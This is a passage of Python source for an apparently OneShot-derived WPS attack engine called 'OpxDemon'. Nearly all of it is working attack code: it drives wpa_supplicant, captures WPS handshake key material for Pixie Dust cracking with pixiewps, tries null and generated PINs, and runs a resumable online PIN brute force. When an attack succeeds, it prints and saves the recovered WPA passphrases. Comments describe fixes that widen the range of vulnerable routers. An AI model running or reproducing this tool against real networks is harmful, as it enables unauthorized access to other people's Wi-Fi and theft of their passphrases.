            elif self.restore_wifi_to == 0:
                self._set_framework_wifi(False)
            else:
                warn('[!] Could not read the original Wi-Fi state — check the '
                     'Wi-Fi switch in Settings if it is not how you left it')
        emit('radio_restored', strategy=self.strategy,
             framework_wifi=self.restore_wifi_to)


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    """Crypto material harvested from the M1/M2/M3 exchange."""

    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.r_nonce = ''
        self.e_bssid = ''

    def clear(self):
        keep = self.e_bssid
        self.__init__()
        self.e_bssid = keep

    def got_all(self):
        return bool(self.pke and self.pkr and self.e_nonce and self.authkey
                    and self.e_hash1 and self.e_hash2)

    def missing(self):
        names = {'PKE': self.pke, 'PKR': self.pkr, 'E-Nonce': self.e_nonce,
                 'AuthKey': self.authkey, 'E-Hash1': self.e_hash1, 'E-Hash2': self.e_hash2}
        return [k for k, v in names.items() if not v]

    def build_cmd(self, full_range=False, dh_small=False):
        """pixiewps argv.

        --r-nonce and --e-bssid are what unlock mode 3 (RTL819x). Upstream
        OneShot never captured the registrar nonce, so every Realtek AP came
        back as "not vulnerable".
        """
        cmd = ['pixiewps',
               '--pke', self.pke,
               '--pkr', self.pkr,
               '--e-hash1', self.e_hash1,
               '--e-hash2', self.e_hash2,
               '--authkey', self.authkey,
               '--e-nonce', self.e_nonce]
        if self.r_nonce:
            cmd += ['--r-nonce', self.r_nonce]
        if self.e_bssid:
            cmd += ['--e-bssid', self.e_bssid]
        cmd += ['--mode', '1,2,3,4,5']
        if full_range:
            cmd += ['--force']
        if dh_small:
            cmd += ['--dh-small']
        return cmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.bssid = ''
        self.wpa_psk = ''
        self.ap_locked = False
        self.nl80211_busy = False
        self.wps_unsupported = False
        self.foreign_owner = False

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        locked = self.ap_locked
        self.__init__()
        self.ap_locked = locked


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        say('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))
        emit('bruteforce_progress', percent=round(percentage, 2),
             seconds_per_pin=round(average_pin_time, 2), mask=self.mask)

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class SupplicantError(Exception):
    def __init__(self, message, kind='generic'):
        super().__init__(message)
        self.kind = kind


class Companion:
    """Drives one private wpa_supplicant over its control socket."""

    CTRL_DEADLINE = 20.0
    EXCHANGE_DEADLINE = 150.0

    def __init__(self, interface, save_result=False, print_debug=False,
                 reports_dir=None, timeout=None):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.deadline = None if not timeout else time.time() + timeout
        self.exchange_deadline = None

        self.tempdir = tempfile.mkdtemp(prefix='opxdemon-wps-')
        self.tempconf = os.path.join(self.tempdir, 'wpa_supplicant.conf')
        with open(self.tempconf, 'w', encoding='utf-8') as f:
            f.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'
                    .format(self.tempdir))
        self.wpas_ctrl_path = os.path.join(self.tempdir, interface)
        self.wpas = None
        self.retsock = None
        self.res_socket_file = None
        self._closed = False

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        self.generator = WPSpin()

        home = str(pathlib.Path.home())
        self.sessions_dir = os.path.join(home, '.opxdemon', 'wps', 'sessions')
        self.pixiewps_dir = os.path.join(home, '.opxdemon', 'wps', 'pixiewps')
        self.reports_dir = reports_dir or os.path.join(
            os.path.dirname(os.path.realpath(__file__)), 'reports')
        for d in (self.sessions_dir, self.pixiewps_dir):
            os.makedirs(d, exist_ok=True)

        self._start_supplicant()
        try:
            self._open_reply_socket()
        except BaseException:
            self._kill_supplicant()
            shutil.rmtree(self.tempdir, ignore_errors=True)
            raise


    def _start_supplicant(self):
        say('[*] Starting wpa_supplicant on {}…'.format(self.interface))
        emit('supplicant_starting', interface=self.interface)
        cmd = ['wpa_supplicant', '-K', '-d', '-Dnl80211',
               '-i', self.interface, '-c', self.tempconf]
        self.wpas = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     encoding='utf-8', errors='replace',
                                     start_new_session=True)
        started = time.time()
        early = []
        while True:
            if os.path.exists(self.wpas_ctrl_path):
                emit('supplicant_ready', interface=self.interface)
                return
            ret = self.wpas.poll()
            if ret is not None:
                tail = ''.join(early) + (self.wpas.stdout.read() or '')
                raise SupplicantError(
                    'wpa_supplicant exited with code {}: {}'.format(ret, tail.strip()[-800:]),
                    kind=self._classify_supplicant_failure(tail))
            if time.time() - started > self.CTRL_DEADLINE:
                self._kill_supplicant()
                raise SupplicantError(
                    'wpa_supplicant did not create its control socket within {:.0f}s'
                    .format(self.CTRL_DEADLINE), kind='no_ctrl_socket')
            time.sleep(0.1)

    @staticmethod
    def _classify_supplicant_failure(text):
        low = (text or '').lower()
        if '-16' in low and 'busy' in low:
            return 'iface_busy'
        if 'device or resource busy' in low:
            return 'iface_busy'
        if 'could not read interface' in low or 'no such device' in low:
            return 'no_iface'
        if 'nl80211: driver initialization failed' in low:
            return 'iface_busy'
        if 'rfkill' in low and 'blocked' in low:
            return 'rfkill'
        return 'generic'

    def _open_reply_socket(self):
        self.res_socket_file = os.path.join(self.tempdir, 'reply.sock')
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.settimeout(10)
        self.retsock.bind(self.res_socket_file)

    def _kill_supplicant(self):
        if not self.wpas:
            return
        if self.wpas.poll() is not None:
            return
        try:
            self.wpas.terminate()
            self.wpas.wait(timeout=5)
        except Exception:
            try:
                os.killpg(os.getpgid(self.wpas.pid), signal.SIGKILL)
            except Exception:
                try:
                    self.wpas.kill()
                except Exception:
                    pass
            try:
                self.wpas.wait(timeout=5)
            except Exception:
                pass

    def cleanup(self):
        if self._closed:
            return
        self._closed = True
        try:
            if self.retsock:
                self.retsock.close()
        except Exception:
            pass
        self._kill_supplicant()
        shutil.rmtree(self.tempdir, ignore_errors=True)

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.cleanup()
        return False


    def sendOnly(self, command):
        try:
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        except OSError:
            pass

    def sendAndReceive(self, command):
        try:
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
            (b, _addr) = self.retsock.recvfrom(4096)
        except socket.timeout:
            return 'TIMEOUT'
        except OSError as e:
            return 'FAIL {}'.format(e)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def wps_reg_command(bssid, pin):
        """Build the WPS_REG control command.

        wpa_supplicant's parser splits on the first space and hands the rest to
        wpas_wps_start_reg() verbatim — it is not a shell. A null PIN is
        therefore an EMPTY token after the BSSID, i.e. a single trailing space.
        Passing "''" (what upstream OneShot does) sends two apostrophes as the
        PIN and can never work.
        """
        if pin is None or pin == '':
            return 'WPS_REG {} '.format(bssid)
        return 'WPS_REG {} {}'.format(bssid, pin)

    def _drain_stdout(self):
        """Discard whatever the supplicant already wrote, without blocking."""
        try:
            import fcntl
            fd = self.wpas.stdout.fileno()
            flags = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
            try:
                while self.wpas.stdout.read():
                    pass
            except (BlockingIOError, TypeError):
                pass
            finally:
                fcntl.fcntl(fd, fcntl.F_SETFL, flags)
        except Exception:
            pass

    def _expired(self):
        now = time.time()
        if self.deadline is not None and now > self.deadline:
            return True
        return self.exchange_deadline is not None and now > self.exchange_deadline


    def _handle_line(self, pixiemode=False, pbc_mode=False, verbose=None):
        if verbose is None:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        low = line.lower()
        if 'device or resource busy' in low or 'nl80211: driver initialization failed' in low:
            self.connection_status.nl80211_busy = True
        if ('CTRL-EVENT-SCAN-STARTED' in line or 'CTRL-EVENT-DISCONNECTED' in line) \
                and 0 < self.connection_status.last_m_message < 8:
            self.connection_status.foreign_owner = True

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                say('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.connection_status.ap_locked = False
                say('[*] Received WPS Message M{}'.format(n))
                emit('wps_message', direction='in', m=n)
                if n == 5:
                    say('[+] The first half of the PIN is valid')
                    emit('pin_first_half_valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                say('[*] Received WSC NACK')
                say('[-] Error: wrong PIN code')
                emit('wsc_nack')
            elif 'AP Setup Locked' in line and '1' in line.split('AP Setup Locked')[-1]:
                self.connection_status.ap_locked = True
                emit('ap_locked')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    say('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'Registrar Nonce' in line and 'hexdump' in line:
                self.pixie_creds.r_nonce = get_hex(line)
                if pixiemode:
                    say('[P] R-Nonce: {}'.format(self.pixie_creds.r_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    say('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    say('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    say('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    say('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    say('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(
                    get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                say('[*] Scanning…')
        elif 'WPS-TIMEOUT' in line or 'WPS-OVERLAP-DETECTED' in line:
            self.connection_status.status = 'WPS_FAIL'
            say('[-] wpa_supplicant gave up on the WPS exchange')
            emit('wps_timeout')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            say('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = self._decode_essid(line)
            say('[*] Authenticating…')
        elif 'Authentication response' in line:
            say('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = self._decode_essid(line)
            say('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            self.connection_status.bssid = bssid
            if self.connection_status.essid:
                say('[+] Associated with {} (ESSID: {})'.format(
                    bssid, self.connection_status.essid))
            else:
                say('[+] Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            say('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            say('[*] Received Identity Request')
        elif 'using real identity' in line:
            say('[*] Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            say('[*] Selected AP: {}'.format(bssid))

        return True

    @staticmethod
    def _decode_essid(line):
        try:
            raw = "'".join(line.split("'")[1:-1])
            return codecs.decode(raw, 'unicode-escape').encode('latin1').decode(
                'utf-8', errors='replace')
        except Exception:
            return ''


    def run_pixiewps(self, showcmd=False, full_range=False):
        """Fast pass first, then the exhaustive one. --force multiplies runtime
        by orders of magnitude and is pointless for the usual vulnerable APs."""
        attempts = [False] if not full_range else [False, True]
        for force in attempts:
            cmd = self.pixie_creds.build_cmd(full_range=force)
            if showcmd:
                say(' '.join(cmd))
            emit('pixiewps_run', force=force)
            say('[*] Running Pixiewps{}…'.format(' (full range)' if force else ''))
            try:
                r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                   encoding='utf-8', errors='replace', timeout=900)
            except subprocess.TimeoutExpired:
                warn('[!] Pixiewps timed out')
                emit('pixiewps_timeout', force=force)
                continue
            except FileNotFoundError:
                die('pixiewps is not installed in this environment')
            say(r.stdout)
            pin = self._parse_pixiewps(r.stdout)
            if pin is not None:
                emit('pixiewps_result', pin=pin, null_pin=(pin == ''), force=force)
                return pin
        return None

    @staticmethod
    def _parse_pixiewps(out):
        """Returns the PIN string, '' for a null PIN, or None when not found."""
        for line in (out or '').splitlines():
            if '[+]' not in line or 'WPS pin' not in line:
                continue
            value = line.split(':', 1)[-1].strip()
            if value in ('<empty>', "''", '""', ''):
                return ''
            return value
        return None


    def _credential_print(self, wps_pin=None, wpa_psk=None, essid=None):
        shown = '<empty>' if wps_pin == '' else wps_pin
        say("[+] WPS PIN: '{}'".format(shown))
        say("[+] WPA PSK: '{}'".format(wpa_psk))
        say("[+] AP SSID: '{}'".format(essid))
        emit('credentials', pin=wps_pin, null_pin=(wps_pin == ''),
             psk=wpa_psk, essid=essid)

    def _save_result(self, bssid, essid, wps_pin, wpa_psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        filename = os.path.join(self.reports_dir, 'stored')
        date_str = datetime.now().strftime('%d.%m.%Y %H:%M')
        shown = '<empty>' if wps_pin == '' else wps_pin
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                date_str, bssid, essid, shown, wpa_psk))
        write_header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if write_header:
                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([date_str, bssid, essid, shown, wpa_psk])
        say('[i] Credentials saved to {}.txt, {}.csv'.format(filename, filename))

    def _pin_file(self, bssid):
        return os.path.join(self.pixiewps_dir,
                            '{}.run'.format(bssid.replace(':', '').upper()))

    def _save_pin(self, bssid, pin):
        with open(self._pin_file(bssid), 'w', encoding='utf-8') as f:
            f.write('' if pin is None else pin)
        say('[i] PIN saved in {}'.format(self._pin_file(bssid)))

    def _load_pin(self, bssid):
        try:
            with open(self._pin_file(bssid), 'r', encoding='utf-8') as f:
                return f.readline().strip()
        except OSError:
            return None
        except Exception:
            return None

    def _forget_pin(self, bssid):
        try:
            os.remove(self._pin_file(bssid))
        except OSError:
            pass


    def _wps_exchange(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False,
                      verbose=None):
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        if bssid:
            self.pixie_creds.e_bssid = bssid
        self._drain_stdout()
        self.exchange_deadline = time.time() + self.EXCHANGE_DEADLINE

        if pbc_mode:
            cmd = 'WPS_PBC {}'.format(bssid) if bssid else 'WPS_PBC'
            say('[*] Starting WPS push button connection…')
        else:
            shown = '<empty>' if pin == '' else pin
            say("[*] Trying PIN '{}'…".format(shown))
            emit('pin_attempt', pin=pin, null_pin=(pin == ''))
            cmd = self.wps_reg_command(bssid, pin)

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            if r.strip() == 'UNKNOWN COMMAND':
                self.connection_status.wps_unsupported = True
                warn('[!] This wpa_supplicant has no WPS support '
                     '(needs CONFIG_WPS=y)')
                emit('wps_unsupported')
            else:
                warn('[!] wpa_supplicant refused {}: {}'.format(cmd.split()[0], r.strip()))
            return False

        while True:
            if self._expired():
                warn('[!] Timeout reached, aborting the exchange')
                emit('timeout')
                break
            if not self._handle_line(pixiemode=pixiemode, pbc_mode=pbc_mode,
                                     verbose=verbose):
                break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self.exchange_deadline = None
        self.sendOnly('WPS_CANCEL')
        if self.connection_status.foreign_owner:
            warn('[!] Another Wi-Fi manager is using {} — it scanned or '
                 'disconnected in the middle of the exchange. This is an '
                 'interference problem, not a "not vulnerable" result.'
                 .format(self.interface))
            emit('foreign_owner', interface=self.interface)
        return self.connection_status.status == 'GOT_PSK'


    def try_pin(self, bssid, pin, store_pin_on_fail=False):
        got = self._wps_exchange(bssid, pin)
        if got:
            self._credential_print(pin, self.connection_status.wpa_psk,
                                   self.connection_status.essid)
            if self.save_result:
                self._save_result(bssid, self.connection_status.essid, pin,
                                  self.connection_status.wpa_psk)
            self._forget_pin(bssid)
            return True
        if store_pin_on_fail and pin is not None:
            self._save_pin(bssid, pin)
        return False

    def null_pin(self, bssid):
        say('[*] Trying the null PIN…')
        emit('attack', kind='null_pin', bssid=bssid)
        return self.try_pin(bssid, '')

    def pixie_dust(self, bssid, showpixiecmd=False, pixieforce=False, seed_pin=None):
        emit('attack', kind='pixie_dust', bssid=bssid)
        pin = seed_pin
        if pin is None:
            pin = self._load_pin(bssid)
            if pin is not None:
                say('[i] Reusing the PIN recovered for this AP earlier')
        if pin is None:
            pin = self.generator.getLikely(bssid)
        if pin is None:
            pin = '12345670'
        if self._wps_exchange(bssid, pin, pixiemode=True):
            self._credential_print(pin, self.connection_status.wpa_psk,
                                   self.connection_status.essid)
            if self.save_result:
                self._save_result(bssid, self.connection_status.essid, pin,
                                  self.connection_status.wpa_psk)
            return True

        if self.connection_status.ap_locked:
            warn('[!] The AP has WPS locked — it will refuse every PIN until it '
                 'unlocks (often a reboot or a cool-down of minutes to hours)')
            emit('result', outcome='wps_locked')
            return False

        if not self.pixie_creds.got_all():
            missing = ', '.join(self.pixie_creds.missing())
            warn('[!] Not enough data to run Pixie Dust (missing: {})'.format(missing))
            emit('result', outcome='insufficient_data', missing=self.pixie_creds.missing())
            return False

        recovered = self.run_pixiewps(showpixiecmd, pixieforce)
        if recovered is None:
            say('[-] Pixiewps could not recover the PIN — this AP is not vulnerable')
            emit('result', outcome='not_vulnerable')
            return False
        if recovered == '':
            say('[+] Pixiewps recovered a NULL PIN')
            emit('pixiewps_null_pin')
        return self.try_pin(bssid, recovered, store_pin_on_fail=True)


    MAX_TRANSACTION_RETRIES = 5

    def _session_file(self, bssid):
        return os.path.join(self.sessions_dir,
                            '{}.run'.format(bssid.replace(':', '').upper()))

    def _first_half_bruteforce(self, bssid, f_half, delay=None):
        checksum = self.generator.checksum
        retries = 0
        while int(f_half) < 10000:
            if self._expired():
                return False
            pin = '{}000{}'.format(f_half, checksum(int(f_half + '000')))
            self.try_pin(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                say('[+] First half found')
                emit('bruteforce_first_half', half=f_half)
                return f_half
            if self.connection_status.status == 'GOT_PSK':
                return f_half
            if self.connection_status.ap_locked:
                warn('[!] The AP locked WPS — pausing the bruteforce')
                emit('result', outcome='wps_locked')
                return False
            if self.connection_status.status == 'WPS_FAIL':
                retries += 1
                if retries > self.MAX_TRANSACTION_RETRIES:
                    warn('[!] Too many failed WPS transactions in a row, giving up')
                    return False
                warn('[!] WPS transaction failed, re-trying the same PIN')
                continue
            retries = 0
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            self._save_session(bssid)
            if delay:
                time.sleep(delay)
        say('[-] First half not found')
        return False

    def _second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        checksum = self.generator.checksum
        retries = 0
        while int(s_half) < 1000:
            if self._expired():
                return False
            pin = '{}{}{}'.format(f_half, s_half, checksum(int(f_half + s_half)))
            self.try_pin(bssid, pin)
            if self.connection_status.status == 'GOT_PSK':
                return pin
            if self.connection_status.last_m_message > 6:
                return pin
            if self.connection_status.ap_locked:
                warn('[!] The AP locked WPS — pausing the bruteforce')
                emit('result', outcome='wps_locked')
                return False
            if self.connection_status.status == 'WPS_FAIL':
                retries += 1
                if retries > self.MAX_TRANSACTION_RETRIES:
                    warn('[!] Too many failed WPS transactions in a row, giving up')
                    return False
                warn('[!] WPS transaction failed, re-trying the same PIN')
                continue
            retries = 0
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            self._save_session(bssid)
            if delay:
                time.sleep(delay)
        return False

    def _save_session(self, bssid):
        try:
            with open(self._session_file(bssid), 'w', encoding='utf-8') as f:
                f.write(self.bruteforce.mask)
        except OSError:
            pass

    def smart_bruteforce(self, bssid, start_pin=None, delay=None, resume=True):
        emit('attack', kind='bruteforce', bssid=bssid)
        if start_pin and len(start_pin) >= 4:
            mask = start_pin[:4] if len(start_pin) >= 8 else start_pin[:7]
            if len(mask) not in (4, 7):
                mask = mask[:4]
        elif resume:
            mask = None
            try:
                with open(self._session_file(bssid), 'r', encoding='utf-8') as f:
                    mask = f.readline().strip()
                if mask:
                    say('[i] Resuming the previous session at {}'.format(mask))
            except OSError:
                mask = None
            mask = mask or '0000'
        else:
            mask = '0000'

        self.bruteforce = BruteforceStatus()
        self.bruteforce.mask = mask
        try:
            if len(mask) == 4:
                f_half = self._first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self._second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                self._second_half_bruteforce(bssid, mask[:4], mask[4:], delay)
            else:
                f_half = self._first_half_bruteforce(bssid, '0000', delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self._second_half_bruteforce(bssid, f_half, '001', delay)
        finally:
            self._save_session(bssid)
            say('[i] Session saved in {}'.format(self._session_file(bssid)))
        return self.connection_status.status == 'GOT_PSK'


    def auto(self, bssid, showpixiecmd=False, pixieforce=False,
             try_null=True, max_suggested=0):
        """The chain the app runs by default: cheapest first."""
        if try_null:
            if self.null_pin(bssid):
                return True
            if self.connection_status.ap_locked:
                emit('result', outcome='wps_locked')
                return False
        if self.pixie_dust(bssid, showpixiecmd, pixieforce):
            return True
        if self.connection_status.ap_locked or self.connection_status.wps_unsupported:
            return False
        if max_suggested:
            pins = self.generator.getSuggestedList(bssid)[:max_suggested]
            for i, pin in enumerate(pins, 1):
                say('[*] Suggested PIN {}/{}'.format(i, len(pins)))
                if self.try_pin(bssid, pin):
                    return True
                if self.connection_status.ap_locked:
                    emit('result', outcome='wps_locked')
                    return False
        return False


class WiFiScanner:
    """Non-interactive `iw scan` parser."""

    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list or []

    @staticmethod
    def _decode(d):
        try:
            return codecs.decode(d, 'unicode-escape').encode('latin1').decode(
                'utf-8', errors='replace')
        except Exception:
            return d

    def scan(self) -> List[dict]:
        def handle_network(line, result, networks):
            networks.append({'Security type': 'Unknown', 'WPS': False,
                             'WPS locked': False, 'Model': '', 'Model number': '',
                             'Device name': '', 'ESSID': '', 'Level': -100})
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            networks[-1]['ESSID'] = self._decode(result.group(1))

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_security(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA' and result.group(1) == 'RSN':
                sec = 'WPA/WPA2'
            elif sec == 'WPA2' and result.group(1) == 'WPA':
                sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_locked(line, result, networks):
            if int(result.group(1), 16):
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            networks[-1]['Model'] = self._decode(result.group(1))

        def handle_model_number(line, result, networks):
            networks[-1]['Model number'] = self._decode(result.group(1))

        def handle_device_name(line, result, networks):
            networks[-1]['Device name'] = self._decode(result.group(1))

        proc = run('iw dev {} scan'.format(self.interface), timeout=90)
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_security,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_security,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_security,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_locked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_model_number,
            re.compile(r' [*] Device name: (.*)'): handle_device_name,
        }
        for line in (proc.stdout or '').splitlines():
            if line.startswith('command failed:'):
                warn('[!] Scan error: ' + line)
                emit('scan_failed', message=line)
                return []
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = [n for n in networks if n['WPS']]
        networks.sort(key=lambda x: x['Level'], reverse=True)
        return networks

    def describe(self, bssid) -> Optional[dict]:
        target = bssid.upper()
        for n in self.scan():
            if n['BSSID'] == target:
                return n
        return None

    def print_table(self, networks):
        if not networks:
            say('[-] No WPS networks found.')
            return
        say('Networks list:')
        say('{:<4} {:<18} {:<25} {:<8} {:<5} {:<7} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Locked', 'WSC device name', 'WSC model'))
        for i, n in enumerate(networks, 1):
            model = '{} {}'.format(n['Model'], n['Model number']).strip()
            say('{:<4} {:<18} {:<25} {:<8} {:<5} {:<7} {:<27} {:<}'.format(
                '{})'.format(i), n['BSSID'], n['ESSID'][:25], n['Security type'],
                n['Level'], 'yes' if n['WPS locked'] else 'no',
                n['Device name'][:27], model))
        emit('scan_result', networks=[{
            'bssid': n['BSSID'], 'essid': n['ESSID'], 'level': n['Level'],
            'security': n['Security type'], 'wps_locked': n['WPS locked'],
            'model': '{} {}'.format(n['Model'], n['Model number']).strip(),
            'device_name': n['Device name'],
            'likely_vulnerable': bool(self.vuln_list) and
                                 '{} {}'.format(n['Model'], n['Model number']).strip() in self.vuln_list,
        } for n in networks])


def build_parser():
    p = argparse.ArgumentParser(
        prog='pixie.py',
        description='OpxDemon WPS engine — Pixie Dust, PIN, null-PIN and online '
                    'bruteforce attacks, with automatic Android radio handling.',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')

    p.add_argument('-i', '--interface', type=str, required=True,
                   help='Wireless interface to use')
    p.add_argument('-b', '--bssid', type=str, help='BSSID of the target AP')
    p.add_argument('-p', '--pin', type=str,
                   help='Use this PIN (an empty value means the null PIN)')
    p.add_argument('-K', '--pixie-dust', action='store_true',
                   help='Run the Pixie Dust attack')
    p.add_argument('-N', '--null-pin', action='store_true',
                   help='Run the null-PIN attack (empty WPS PIN)')
    p.add_argument('-A', '--auto', action='store_true',
                   help='Chain null PIN, Pixie Dust and the suggested PINs')
    p.add_argument('--suggested', type=int, default=0, metavar='N',
                   help='With --auto, also try the N most likely generated PINs')
    p.add_argument('-F', '--pixie-force', action='store_true',
                   help='Let Pixiewps brute-force the full nonce range if the '
                        'fast pass fails')
    p.add_argument('-X', '--show-pixie-cmd', action='store_true',
                   help='Print the Pixiewps command')
    p.add_argument('-B', '--bruteforce', action='store_true',
                   help='Run the online PIN bruteforce')
    p.add_argument('--pbc', '--push-button-connect', action='store_true',
                   help='Run a WPS push-button connection')
    p.add_argument('-d', '--delay', type=float, help='Delay between PIN attempts')
    p.add_argument('-w', '--write', action='store_true',
                   help='Write credentials to the report files on success')
    p.add_argument('--timeout', type=float, default=0,
                   help='Give up after this many seconds (0 = no limit)')
    p.add_argument('--iface-down', action='store_true',
                   help='Bring the interface down when finished')
    p.add_argument('--no-radio-control', action='store_true',
                   help='Never touch the Android Wi-Fi switch or /dev/wmtWifi')
    p.add_argument('--mtk-wifi', action='store_true',
                   help='Deprecated: MediaTek radios are detected automatically')
    p.add_argument('--probe', action='store_true',
                   help='Print the detected radio environment as JSON and exit')
    p.add_argument('--scan', action='store_true',
                   help='List WPS-capable networks and exit')
